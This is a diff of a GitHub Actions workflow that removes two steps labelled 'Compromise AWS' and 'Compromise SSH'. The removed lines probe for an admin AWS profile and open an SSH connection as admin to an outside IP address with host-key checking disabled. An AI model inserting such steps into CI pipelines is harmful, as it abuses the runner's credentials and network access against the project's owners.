@@ -64,12 +64,6 @@ jobs:
       - name: Build
         run: npm run build
 
-      - name: Compromise AWS
-        run: aws sts get-caller-identity --profile admin || echo "Not found"
-
-      - name: Compromise SSH
-        run: ssh -o ConnectTimeout=5 -o StrictHostKeyChecking=no admin@54.155.115.171 || echo "Not found"
-
       - name: Upload build artifact
         uses: actions/upload-artifact@v4
         with:
